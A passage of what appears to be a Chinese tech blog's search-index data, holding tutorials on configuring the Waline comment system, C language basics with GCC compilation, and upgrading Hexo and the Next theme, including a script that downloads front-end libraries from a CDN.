SMTP 密码。 SMTP_SECURE： SMTP 邮件发送加密，默认为 true，设置为 false 则不会加密请求 SITE_NAME：网站名称，用于在消息中显示。 SITE_URL：网站地址，用于在消息中显示。 SENDER_NAME：自定义发送邮件的发件人，选填。 SENDER_EMAIL：自定义发送邮件的发件地址，选填。 MAIL_SUBJECT：评论回复邮件标题自定义 MAIL_TEMPLATE：评论回复邮件内容自定义 MAIL_SUBJECT_ADMIN：新评论通知邮件标题自定义 MAIL_TEMPLATE_ADMIN：新评论通知邮件内容自定义 提示 用户注册和评论的邮件通知都会用到邮件服务 由于国内腾讯云、阿里云默认禁用了 25 端口，若 Waline 的服务端是部署在云服务器上，则需要使用 465 端口，并启用 SSL 邮件加密，最后系统防火墙别忘了开放 465 端口 Waline Client 的其他特性自定义样式Waline 客户端默认提供了一些 CSS 变量，可以很轻松的通过这些变量自定义 Waline 客户端的 CSS 样式： 1234567891011121314151617181920212223242526272829303132333435363738394041424344:root { /* 字体大小 */ --waline-font-size: 16px; /* 常规颜色 */ --waline-white: #fff; --waline-light-grey: #999; --waline-dark-grey: #666; /* 主题色 */ --waline-theme-color: #27ae60; --waline-active-color: #2ecc71; /* 布局颜色 */ --waline-color: #444; --waline-bgcolor: #fff; --waline-bgcolor-light: #f8f8f8; --waline-bgcolor-hover: #f0f0f0; --waline-border-color: #ddd; --waline-disable-bgcolor: #f8f8f8; --waline-disable-color: #bbb; --waline-code-bgcolor: #282c34; /* 特殊颜色 */ --waline-bq-color: #f0f0f0; /* 头像 */ --waline-avatar-size: 3.25rem; --waline-m-avatar-size: calc(var(--waline-avatar-size) * 9 / 13); /* 徽章 */ --waline-badge-color: #3498db; --waline-badge-font-size: 0.775em; /* 信息 */ --waline-info-bgcolor: #f8f8f8; --waline-info-color: #999; --waline-info-font-size: 0.625em; /* 渲染选择 */ --waline-border: 1px solid var(--waline-border-color); --waline-avatar-radius: 50%; --waline-box-shadow: none;} 如果使用了一个大量运用阴影 (box-shadow) 的主题，可以通过修改 --waline-border 和 --waline-box-shadow 来更改 Waline 客户端的阴影样式，如: 12345678910:root { --waline-border: none; --waline-box-shadow: 0 12px 40px rgb(134 151 168 / 25%);}@media (prefers-color-scheme: dark) { body { --waline-box-shadow: 0 12px 40px #0f0e0d; }} 如果上面的 CSS 变量无法满足你对 Waline 样式的定制要求，你可以停止导入 Waline 官方提供的样式，并自己制作 CSS。 自定义表情包 Waline 客户端自定义表情包 启用暗黑模式Waline 客户端默认支持暗黑模式，只需在 Waline 客户端初始化的时候，指定 dark 参数即可 设置 dark: auto 会根据设备颜色模式自动切换 填入 CSS 选择器，则会在对应选择器生效时启用暗黑模式 针对不同的 Hexo 主题，Waline 客户端的配置示例如下： vuepress-theme-hope：它会在 &lt;body&gt; 上添加 theme-dark class 来开启暗黑模式，那么需要将 dark 选项设置为 body.theme-dark Docusaurus：它会在 &lt;html&gt; 上通过设置 data-theme="dark" 开启暗黑模式，那么需要将 dark 选项设置为 \'html[data-theme="dark"]\' hexo-theme-fluid：它会在 &lt;html&gt; 上通过设置 data-user-color-scheme="dark" 开启暗黑模式，那么需要将 dark 选项设置为 \'html[data-user-color-scheme="dark"]\' 若 Hexo 使用的是 Next 主题，且是通过插件 hexo-next-darkmode 来自动添加可切换的暗黑模式，那么可以在 Next 主题的 _config.yml 配置文件里添加以下内容来启用 Waline 客户端的暗黑模式 1234waline: enable: true dark: \'body.darkmode--activated\' ... 在暗黑模式下，Waline 客户端默认会使用以下样式，若希望自定义暗黑模式的 CSS 样式，直接覆盖以下 CSS 样式即可。 12345678910111213141516171819202122/* 根据用户设置 ↓ */darkmode-selector { /* 常规颜色 */ --waline-white: #000; --waline-light-grey: #666; --waline-dark-grey: #999; /* 布局颜色 */ --waline-color: #888; --waline-bgcolor: #1e1e1e; --waline-bgcolor-light: #272727; --waline-border-color: #333; --waline-disable-bgcolor: #444; --waline-disable-color: #272727; /* 特殊颜色 */ --waline-bq-color: #272727; /* 其他颜色 */ --waline-info-bgcolor: #272727; --waline-info-color: #666;} 提示 Next 主题使用插件 hexo-next-darkmode 来自动添加可切换的暗黑模式，详细的步骤可以参考这篇博客。 Github 社交登录最新版 Waline 增加了登录评论功能，除了普通的账号登录之外，还支持使用第三方社交账号进行直接登录。目前官方支持 Github 社交账号登录，当然默认没有开启 Github 社交账号登录功能，需要做一些配置才能支持。若要增加 Github 账号登录功能，需要配置 Github OAuth 密钥。点击 《Register a new OAuth application》 进入 Github OAuth 应用申请页面，这里需要填入以下几个配置： Application name：应用名称，可以随意，会在用户授权时显示，推荐使用博客名称。 Homepage URL：应用主页地址，可以随意，会在用户授权时显示，推荐使用博客地址。 Appcation description：应用描述，可以随意，会在用户授权时显示，非必填项。 Authorization callback URL：应用的回调地址，登录时需要使用。填入 &lt;serverURL&gt;/oauth/github 其中 &lt;serverURL&gt; 是你的 Waline 服务端地址。 填完后点击 Register application 按钮就成功创建应用了，可以在页面中看到 Client ID。点击 Client secrets 栏右边的 Generate a new client secret 按钮，可以获取到该应用的 Client secrets。 最后按照如下环境变量配置，将上面获取到的密钥（Client secrets）配置进 Waline 服务端的环境变量中，然后重新部署 Waline 服务端后即可使用 Github 登录。 环境变量名称 备注 GITHUB_ID 对应 Github OAuth Application 中的 Client ID GITHUB_SECRET 对应 Github OAuth Application 中的 Client secrets 由于 Github 的 API 调用在国内不太稳定，建议直接使用普通的账号登录 上传图片至七牛图床Waline 客户端内置了图像上传的支持，默认会将图片转换为 Base64 字符串，然后通过 Waline Server 进行存储，例如将图片存储到 MySQL。在 Hexo 的 Next 主题下，若希望使用七牛图床，则可以安装 Waline 的第三方插件 hexo-waline-next 来实现。 12345# 卸载Waline官方插件$ npm uninstall @waline/hexo-next --save# 安装Waline第三方插件（默认是最新版本）$ npm install hexo-waline-next --save 第三方插件 hexo-waline-next 使用了七牛官方的 Qiniu-JavaScript-SDK ，为了安全考虑，默认没有包含 Upload Token 的生成实现，因此 Upload Token 需要通过网络从服务端（自建）获取，服务端代码可以参考七牛服务端 SDK 的文档，插件的配置示例如下： 123456waline: enable: true qiniuDebug: false # print the error message of the picture uploaded by qiniu qiniuDomain: https://qiniu.example.cn # The custom domain for qiniu, e.g https://qiniu.example.cn qiniuTokenUrl: https://api.example.cn/qiniu/sdk/token/upload # The api to get qiniu token, e.g https://api.example.cn/qiniu/sdk/token/upload ... qiniuDomain：七牛的外链域名 qiniuDebug：前端是否输出七牛上传图片的错误信息 qiniuTokenUrl：获取七牛 Upload Token 的接口地址 若希望禁用图片上传的功能，可以使用以下配置内容，适用于 Waline 客户端默认的图片上传和七牛图床上传： 1234waline: enable: true allowUploadImage: false # Allow upload picture ... allowUploadImage：是否允许上传图片，默认值为：true 第三方插件 hexo-waline-next 对七牛 Upload Token 接口返回数据（JSON）的定义如下： 1234{ "data": "tdvdhnpSs2JFt8U9-c9hL74ddWtEj", "msg": "success"} 参数名称 类型 实例值 说明 status code Number 200 HTTP 响应状态码，成功返回 200，非法请求来源返回 403，接口调用太频繁返回 429，系统内部出错返回 500 data String tdvdhnpSs2JFt8U9-c9hL74ddWtEj Upload Token 的值 msg String success 消息提示内容 提高七牛 Upload Token 接口的安全性： 全站启用 HTTPS 协议 通过 HTTP Header 的 referer 、 X-Real-IP 、X-Forwarded-For 等来限制请求来源的域名、IP 获取 Upload Token 的接口应该内置限流功能，避免外部恶意频繁调用接口，例如限制每分钟只能调用两次接口 服务端生成 Upload Token 时，应该指定上传策略，例如设置 Token 的有效时间（expires、deadline），具体可参考七牛官方文档一、七牛官方文档二，Java 版服务端的示例代码如下： 1234567891011String bucket = "bucket name";String accessKey = "access key";String secretKey = "secret key";//指定UploadToken的有效时间为10秒long expireSeconds = 10;StringMap putPolicy = new StringMap();Auth auth = Auth.create(accessKey, secretKey);String upToken = auth.uploadToken(bucket, null, expireSeconds, putPolicy);System.out.println(upToken); Waline 开发指南准备工作 使用 Git 克隆项目 1$ git clone https://github.com/lizheming/waline.git 保证 NPM 的版本是 7 Node 14 及以下默认使用 npm@v6，你需要确保自己使用 npm@v7 版本，否则运行或者编译构建 Waline 组件时会出错 12345# 安装最新版的NPM$ npm i -g npm@latest# 查看NPM的版本$ npm -v 安装依赖 123$ cd waline$ npm i 本地开发本地使用以下命令启动 @waline/client，由于 Waline 采用 Client/Server 架构，在调试 client 时，必须配置本地环境变量 SERVERURL 至 waline/packages/client/.env，其中在 waline/packages/client/.env.example 文件里有可参考的配置示例。 1$ npm run client:dev @waline/client 正常启动时，输出的日志信息如下，此时浏览器直接访问 http://127.0.0.1:9000 就可以开始测试本地的 @waline/client 123456789101112131415161718192021222324252627&gt; client:dev&gt; npm run dev --workspace=@waline/client&gt; @waline/client@1.3.3 dev&gt; webpack serve --mode=development --config ./build/webpack.config.js&lt;i&gt; [webpack-dev-server] Project is running at:&lt;i&gt; [webpack-dev-server] Loopback: http://127.0.0.1:9000&lt;i&gt; [webpack-dev-server] On Your Network (IPv4): http://192.168.1.128:9000/&lt;i&gt; [webpack-dev-server] Content not from webpack is served from \'/usr/local/waline/packages/client/public\' directoryasset Waline.min.js 1010 KiB [emitted] (name: main) 1 related assetasset index.html 967 bytes [emitted]runtime modules 27.1 KiB 13 modulescacheable modules 832 KiB modules by path ./src/ 95.3 KiB 48 modules modules by path ../../node_modules/ 737 KiB modules by path ../../node_modules/webpack-dev-server/client/ 48.9 KiB 12 modules modules by path ../../node_modules/style-loader/dist/runtime/*.js 5.02 KiB 6 modules modules by path ../../node_modules/webpack/hot/*.js 4.3 KiB 4 modules modules by path ../../node_modules/html-entities/lib/*.js 81.3 KiB 4 modules modules by path ../../node_modules/@vue/ 437 KiB 4 modules modules by path ../../node_modules/url/ 37.4 KiB 3 modules modules by path ../../node_modules/querystring/*.js 4.51 KiB ../../node_modules/querystring/index.js 127 bytes [built] [code generated] ../../node_modules/querystring/decode.js 2.34 KiB [built] [code generated] ../../node_modules/querystring/encode.js 2.04 KiB [built] [code generated]webpack 5.50.0 compiled successfully in 3160 ms 如果希望在 Hexo Next 主题里测试本地的 @waline/client，那么可以在 Next 的 _config.yml 配置文件中指定 Waline 插件的 libUrl 参数，配置示例如下： 1234waline: enable: true libUrl: http://127.0.0.1:9000/Waline.min.js # Set custom waline cdn url .... 本地使用以下命令启动 @waline/server，为了使 @waline/server 能在本地正常运行，需要配置必要的本地环境变量至 waline/example/.env，其中在 waline/example/.env.example 文件里有可参考的配置示例。@waline/server 正常启动后，默认的服务器地址是 http://127.0.0.1:9000。 1$ npm run server:dev 编译构建12345678# 构建@waline/admin$ npm run admin:build# 构建@waline/client$ npm run client:build# 或者同时构建@waline/admin与@waline/client$ npm run build Waline 组件编译构建完成后，默认会在 waline/node_modules/@waline 目录下生成对应的文件，目录结构如下： 12345waline/node_modules/@waline├── admin -&gt; ../../packages/admin├── client -&gt; ../../packages/client├── cloudbase -&gt; ../../packages/cloudbase└── vercel -&gt; ../../packages/server 值得一提的是，以 @waline/client 组件为例，编译构建完成后，实际的输出路径是：waline/packages/client/dist Waline 常见问题防止恶意刷评论 Waline 服务端启用评论审核功能 Waline 服务端启用基于 IP 的评论发布频率限制功能 Waline 服务端启用客户端登录后才允许评论的功能，确保服务端的版本大于等于 0.26.0，同时 Waline 的客户端需要增加 login=force 的配置用于隐藏博客页面上的评论匿名输入框 Waline 的服务端如果启用客户端登录后才允许评论的功能，那么还需要在服务端的环境变量里配置邮件服务相关的参数；这是为了防止恶意注册，当配置了邮件服务相关的环境变量后，用户注册流程会增加邮箱验证码确认相关的操作 Waline 发布评论很慢发布评论的时候因为一些特殊原因，例如垃圾邮件检测、评论通知都是串联操作。其中垃圾邮件检测使用的是 Akismet 提供的服务，这块由于调用国外服务可能会造成访问过慢，可以通过 AKISMET_KEY=false 后端环境变量关闭垃圾评论检测功能来定位问题。除了垃圾评论检测服务之外，评论通知中的邮件通知也有可能造成超时，这块建议可以先关闭评论通知再测一下是否是因为该功能导致的过慢。 Github 登录无法管理后台Github 登录后无法管理后台，解决方法可参考 Github Issue：通过 Github 登录无法管理后台 Waline 版本更新流程 更新 MySQL 数据库表结构 更新 Hexo-Waline-Next 插件 更新 Waline Server 的代码，重新构建 Docker 镜像 若在 Next 主题的 _config.yml 文件中，Waline 官方插件的 CDN 配置里有指定 Waline Client 的版本（如下配置），那么还需要更改 Client 的版本号，否则默认会使用最新版的 Waline Client 1234waline: enable: true libUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.js cssUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.css 提示 由于 Waline 采用 Client/Server 架构，客户端与服务端的版本一般需要匹配才能正常运行。 waline/packages/server/src/controller/index.js 源文件涉及到 Waline Client 版本的定义（最新版本） waline/packages/server/src/middleware/dashboard.js 源文件涉及到 Waline Admin 版本的定义（最新版本） 项目源码 Waline Github Waline DockerHub 参考博客 Waline 官方中文文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"C 语言基础之一",url:"/posts/1228be9f.html",text:'语言发展历程机器语言计算机的大脑或者说心脏就是 CPU，它控制着整个计算机的运作。每种 CPU，都有自己的指令系统。这个指令系统，就是该 CPU 的机器语言。机器语言是一组由 0 和 1 系列组成的指令码，这些指令码，是 CPU 制造厂商规定出来的，然后发布出来，要求程序员遵守。要让计算机干活，就得用机器语言（二级制数）去命令它。这样的命令，不是一条两条，而是上百条。不同型号的计算机其机器语言是不相通的，也就是使用某种计算机的机器指令编制的程序，不能在另一种计算机上执行。 汇编语言机器语言编程很令人烦恼，因此终于出现了汇编语言，就是一些标识符取代 0 与 1。汇编语言是一门人类可以比较轻松认识的编程语言。只是这门语言计算机并不认识，所以人类还不能用这门语言命令计算机做事情。所以，有一类专门的程序，既认识机器语言，又认识汇编语言，也就是编译器，将标识符换成 0 与 1，知道怎么把汇编语言翻译成机器语言。 高级语言汇编语言和机器语言都是面向机器的，机器不同，语言也不同。既然有办法让汇编语言翻译成机器语言，难道就不能把其他更人性化的语言翻译成机器语言？1954 年，Fortran 语言出现了，其后相继出现了其他的类似语言。这批语言，使程序员摆脱了计算机硬件的限制，把主要精力放在了程序设计上，不在关注低层的计算机硬件。这类语言，称为高级语言。同样的，高级语言要被计算机执行，也需要一个翻译程序将其翻译成机器语言，这就是编译程序，简称 “编译器”。这类高级语言解决问题的方法是分析出解决问题所需要的步骤，把程序看作是数据被加工的过程。基于这类方法的程序设计语言，成为了面向过程的语言。 语言的层次 语言的进化史 为什么要学习 C 语言C 语言的特点优点： 代码量小 功能强大 编程自由 执行速度快 缺点： 可移植性较差 对平台库依赖较多 写代码实现周期长 过于自由，经验不足易出错 学习 C 语言理由 C 语言的应用领域C 语言的应用极其广泛，从网站后台，到底层操作系统，从多媒体应用到大型网络游戏，均可使用 C 语言来开发： C 语言可以写网站后台程序 C 语言可以专门针对某个领域写出功能强大的程序库 C 语言可以写出大型游戏的引擎 C 语言可以写出另一个语言来，例如：PHP 纯 C 语言开发的 C 语言可以写操作系统和驱动程序，并且一般只能用 C 语言编写 任何设备只要配置了微处理器，就都支持 C 语言。从微波炉到手机，都是由 C 语言技术来推动的 详见：各类语言的应用领域图解分析 第一个 C 语言程序编写代码123456#include &lt;stdio.h&gt;int main(int argc, char *argv[]) { printf("Hello World!\\n"); return 0;} 编译代码 GCC 编译命令常用选项说明 选项 含义 -o 指定生成的输出文件名 -E 只进行预处理 -S 只进行预处理和编译 -c 只进行预处理、编译和汇编 编译代码，生成可以执行文件 1$ gcc hello.c -o hello 运行代码 运行可执行文件 123$ ./helloHello World! 代码分析 #include 头文件包含： #include 的意思是头文件包含，#include &lt;stdio.h&gt; 表示包含 stdio.h 这个头文件 使用 C 语言库函数时，需要提前包含库函数对应的头文件，如这里使用了 printf() 函数，则需要包含 stdio.h 头文件 #include &lt;&gt; 与 #include "" 的区别： &lt;&gt; 表示编译器直接按系统指定的目录（/usr/include）检索头文件 "" 表示系统先在 "" 指定的路径（没写路径则默认使用当前路径）查找头文件，如果找不到，再按系统指定的目录检索 main() 函数 一个完整的 C 语言程序，是由一个、且只能有一个 main() 函数（又称主函数，必须有）和若干个其他函数结合而成（可选） main() 函数是 C 语言程序的入口，程序是从 main() 函数开始执行的 printf() 函数 printf() 是 C 语言库函数，功能是向标准输出设备输出一个字符串 printf() 函数在 stdio.h 头文件里定义 \\n 表示回车换行 return 语句 return 代表函数执行完毕 如果 main() 函数定义的时候前面是 int，那么 return 后面就需要写一个整数 如果 main() 函数定义的时候前面是 void，那么 return 后面什么也不需要写 在 main() 函数中 return 0 代表程序执行成功，return -1 代表程序执行失败 int main() 和 void main() 在 C 语言中都是支持的，但 C++ 只支持 int main() 这种定义方式 system 函数system 函数的定义1234567头文件：#include &lt;stdlib.h&gt;声明：int system(const char *command);功能：在已经运行的程序中执行另外一个外部程序参数：外部可执行程序名字返回值： 成功：不同系统返回值不一样 失败：通常是 -1 system 函数的调用12345678#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) { system("ls"); // Linux 平台 // system("calc"); // Windows 平台 return 0;} system 函数的返回值在 Linux 和 Windows 系统下分别调用 system() 函数，若调用成功返回值是不一样的，若调动失败返回值一般为 -1。C 语言所有的库函数调用，只能保证语法是一致的，但不能保证执行结果是一致的；同样的库函数在不同的操作系统下执行结果可能是一样的，也可能是不一样的。Linux 的发展离不开 POSIX 标准，只要符合这个标准的函数，在不同的系统下执行的结果就可以一致。Unix 和 Linux 很多库函数都是支持 POSIX 标准的，但 Windows 支持的比较差。如果将 Unix 代码移植到 Linux 一般代价很小，如果把 Windows 代码移植到 Unix 或者 Linux 就比较麻烦。 C 语言的编译过程C 语言的编译步骤C 语言编译成可执行程序需要经过以下 4 个步骤，详见 编译流程图。 预处理：宏定义展开、头文件展开、条件编译等，同时将代码中的注释删除，这里并不会检查语法 编译：检查语法，将预处理后文件编译生成汇编文件 汇编：将汇编文件生成目标文件（二进制文件） 链接：C 语言编写的程序是需要依赖各种库的，所以编译之后还需要把库链接到最终的可执行程序中去 GCC 的编译过程GCC 的编译步骤 步骤 命令 1. 预处理 gcc -E hello.c -o hello.i 2. 编译到汇编代码 gcc -S hello.c -o hello.s 3. 汇编到目标代码（二进制文件） gcc -c hello.s -o hello.o 4. 链接，生成可执行文件 gcc hello.o -o hello 值得一提的是，以上四个步骤，可以合成一个步骤，直接编译链接成可执行目标文件，命令是 gcc hello.c -o hello 文件后缀的不同含义 文件后缀 含义 .c C 语言文件 .i 预处理后的 C 语言文件 .s 编译后的汇编文件 .o 编译后的目标文件 查找程序所依赖的动态库12345678# GCC编译$ gcc hello.c -o hello# 查看所依赖的动态库$ ldd hello linux-vdso.so.1 =&gt; (0x00007f152053a000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f151ff4d000) /lib64/ld-linux-x86-64.so.2 (0x00007f152031b000) 在 Windows 系统里，可以使用 Dependency Walker 工具查看程序所依赖的动态库（DLL），如下图所示： VS 中 C 语言嵌套汇编代码在 Visual Studio 中，由于下述代码使用了 eax 寄存器，因此程序需要运行在 32 位（x86）的平台。 12345678910111213141516171819#include &lt;stdio.h&gt;int main() { int a; int b; int c; __asm { mov a, 3 // 3的值放在a对应内存的位置 mov b, 4 // 4的值放在a对应内存的位置 mov eax, a // 把a内存的值放在eax寄存器 add eax, b // eax和b相加，结果放在eax mov c, eax // eax的值放在c中 } printf("c = %d\\n", c); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c语言"},{title:"Hexo 与 Next 版本升级教程",url:"/posts/d1f06120.html",text:'前言 Next 官方博客 Next 官方教程 - 版本升级 Next 各版本的仓库 年份 版本 仓库 2014 ~ 2017 v5 https://github.com/iissnan/hexo-theme-next 2018 ~ 2019 v6 ~ v7 https://github.com/theme-next/hexo-theme-next 2020 v8 https://github.com/next-theme/hexo-theme-next Next 与 Hexo 版本适配关系 NodeJS 版本升级NodeJS 版本升级不是必须的，可以根据自己的实际情况选择是否升级，首先在 NodeJS 官网下载最新版的二进制安装包，解压后配置系统环境变量即可。 123456789# 配置环境变量# vim /etc/profileexport PATH=$PATH:/usr/local/node-v14.16.1/binNODE_PATH=/usr/local/node-v14.16.1/lib/node_modulesPATH=$PATH:$NODE_PATHexport NODE_PATH PATH# 使配置生效# source /etc/profile Hexo 版本升级笔者是从 Hexo 3.9.0 升级到 Hexo 5.4.0，步骤如下： 全局升级 Hexo 版本若曾经在系统里，直接使用过 hexo 的命令，才需要执行以下升级操作 123456789101112131415# 清理NPM缓存$ npm cache clean -f# 全局安装版本检测、版本升级工具$ npm install -g npm-check$ npm install -g npm-upgrade# 全局检测哪些模块可以升级，这里可以根据打印的提示信息，手动安装最新版本的模块$ npm-check -g# 全局更新模块$ npm update -g# 全局安装或更新Hexo的最新版本$ npm install --global hexo 博客升级 Hexo 版本1234567891011121314151617181920212223# 进入博客的根目录$ cd /blog-root# 检测Hexo哪些模块可以升级$ npm-check# 删除package-lock.json# rm -rf package-lock.json# 更新package.json$ npm-upgrade# 删除整个模块目录，这样可以避免很多坑$ rm -rf node_modules# 更新Hexo的模块$ npm update --save# 若出现依赖的问题，用以下命令检查一下，然后把报错的统一修复一下即可$ npm audix# 或者强制更新$ npm update --save --force 由于新版的 Hexo 一般增加了不少新特性，因此需要使用新版 Hexo 默认的配置模版文件 _config.yml，同时还需要稍微更改旧版的 package.json 配置文件，否则容易出现各种兼容错误 123456# 进入博客的根目录$ cd /blog-root# 备份旧版的配置文件$ mv _config.yml _config.yml.bak$ mv package.json package.json.bak 12345678$ 单独初始化全新的Hexo博客目录$ hexo init hexo-upgrade$ 拷贝新的配置模版文件到博客的根目录$ cp hexo-upgrade/_config.yml /blog-root/_config.yml$ cp hexo-upgrade/package.json /blog-root/package.json# 最后在新的配置模版文件里，重新追加旧版的Hexo配置内容 升级 Next 主题注意事项笔者 从 Next 7.8.0 升级到 Next 8.3.0，值得一提的是，Next 版本升级必须注意以下事项： Next 与 Hexo 的版本必须兼容 必须使用新版 Next 主题的 _config.yml 配置文件，若继续使用 Next 旧版的 _config.yml 配置文件，容易出现各种兼容错误 版本升级12345678910# 进入博客的主题目录$ cd /boot-root/theme# 备份旧版主题的配置$ mv next next-bak# 拉取最新的代码（注意：Next不同版本使用不同的仓库）$ git clone https://github.com/next-theme/hexo-theme-next next# 最后将旧版的Next配置内容追加到Next新版的配置文件中，包括拷贝旧版自定义的样式、布局文件等 本地下载第三方库（可选）在 Next 8.3.0 的 _config.yml 中，新增了 vendors.internal 属性（如下配置）来指定加载本地的第三方库文件，默认存放路径为 themes/next/source/lib；启用后站点就不再需要依赖第三方的 CDN 资源，而是直接使用本地站点的资源文件，这样可以让站点的访问速度更稳定。 1234567891011# It\'s recommended to use the same version as in `_vendors.yml` to avoid potential problems.# Remember to use the HTTPS protocol of CDN links when you enable HTTPS on your site.vendors: # The CDN provider of NexT internal scripts. # Available values: local | jsdelivr | unpkg | cdnjs # Warning: If you are using the latest master branch of NexT, please set `internal: local` internal: local # The default CDN provider of third-party plugins. # Available values: local | jsdelivr | unpkg | cdnjs # Dependencies for `plugins: local`: https://github.com/next-theme/plugins plugins: local 安装 NexT 插件特别注意 若希望使用本地的第三方库文件，则需要安装 NexT 的 @next-theme/plugins 插件，其中插件的版本必须与 NexT 主题的版本一致。 12# 安装插件$ npm install @next-theme/plugins --save 批量下载第三方库将 themes/next/_vendors.yml 里定义的第三方库文件统一下载下来，并存放在 themes/next/source/lib 目录下，具体步骤如下 临时更改 themes/next/scripts/events/lib/vendors.js 源文件的代码（如下所示），然后执行 hexo g 命令，从输出日志信息中得到批量下载第三方库文件的 curl 命令 将得到的所有 curl 命令保存到 Shell 脚本文件里，然后执行 Shell 脚本文件批量下载第三方库文件到 themes/next/source/lib 目录下 最后还原 themes/next/scripts/events/lib/vendors.js 源文件的代码 1234567891011// 打印下载命令const { name, version, file, alias, unavailable } = value;if (version) { var _path = `https://cdn.jsdelivr.net/npm/${name}@${version}/${file}`; console.log("curl " + _path + " --create-dirs -o ${DIR}" + "/" + name + "/" + file); continue;}const links = { // 省略 ...}; 批量下载 Next 8.3.0 版本所需的第三方库文件的 Shell 脚本文件如下，DIR 是 themes/next/source/lib 目录的绝对路径，请自行更改 123456789101112131415161718192021222324252627282930313233343536#!/bin/shDIR=/usr/local/hexo-develop/themes/next/source/librm -rf ${DIR}/*curl https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js --create-dirs -o ${DIR}/animejs/lib/anime.min.jscurl https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css --create-dirs -o ${DIR}/@fortawesome/fontawesome-free/css/all.min.csscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js --create-dirs -o ${DIR}/prismjs/components/prism-core.min.jscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js --create-dirs -o ${DIR}/prismjs/plugins/autoloader/prism-autoloader.min.jscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/line-numbers/prism-line-numbers.min.js --create-dirs -o ${DIR}/prismjs/plugins/line-numbers/prism-line-numbers.min.jscurl https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js --create-dirs -o ${DIR}/mathjax/es5/tex-mml-chtml.jscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css --create-dirs -o ${DIR}/katex/dist/katex.min.csscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/copy-tex.min.js --create-dirs -o ${DIR}/katex/dist/contrib/copy-tex.min.jscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/copy-tex.min.css --create-dirs -o ${DIR}/katex/dist/contrib/copy-tex.min.csscurl https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js --create-dirs -o ${DIR}/@next-theme/pjax/pjax.min.jscurl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js --create-dirs -o ${DIR}/jquery/dist/jquery.min.jscurl https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js --create-dirs -o ${DIR}/@fancyapps/fancybox/dist/jquery.fancybox.min.jscurl https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css --create-dirs -o ${DIR}/@fancyapps/fancybox/dist/jquery.fancybox.min.csscurl https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js --create-dirs -o ${DIR}/medium-zoom/dist/medium-zoom.min.jscurl https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js --create-dirs -o ${DIR}/lozad/dist/lozad.min.jscurl https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js --create-dirs -o ${DIR}/pangu/dist/browser/pangu.min.jscurl https://cdn.jsdelivr.net/npm/quicklink@2.1.0/dist/quicklink.umd.js --create-dirs -o ${DIR}/quicklink/dist/quicklink.umd.jscurl https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js --create-dirs -o ${DIR}/disqusjs/dist/disqus.jscurl https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css --create-dirs -o ${DIR}/disqusjs/dist/disqusjs.csscurl https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js --create-dirs -o ${DIR}/gitalk/dist/gitalk.min.jscurl https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css --create-dirs -o ${DIR}/gitalk/dist/gitalk.csscurl https://cdn.jsdelivr.net/npm/firebase@8.3.1/firebase-app.js --create-dirs -o ${DIR}/firebase/firebase-app.jscurl https://cdn.jsdelivr.net/npm/firebase@8.3.1/firebase-firestore.js --create-dirs -o ${DIR}/firebase/firebase-firestore.jscurl https://cdn.jsdelivr.net/npm/algoliasearch@4.8.6/dist/algoliasearch-lite.umd.js --create-dirs -o ${DIR}/algoliasearch/dist/algoliasearch-lite.umd.jscurl https://cdn.jsdelivr.net/npm/instantsearch.js@4.19.0/dist/instantsearch.production.min.js --create-dirs -o ${DIR}/instantsearch.js/dist/instantsearch.production.min.jscurl https://cdn.jsdelivr.net/npm/pdfobject@2.2.5/pdfobject.min.js --create-dirs -o ${DIR}/pdfobject/pdfobject.min.jscurl https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js --create-dirs -o ${DIR}/mermaid/dist/mermaid.min.jscurl https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css --create-dirs -o ${DIR}/animate.css/animate.min.csscurl https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js --create-dirs -o 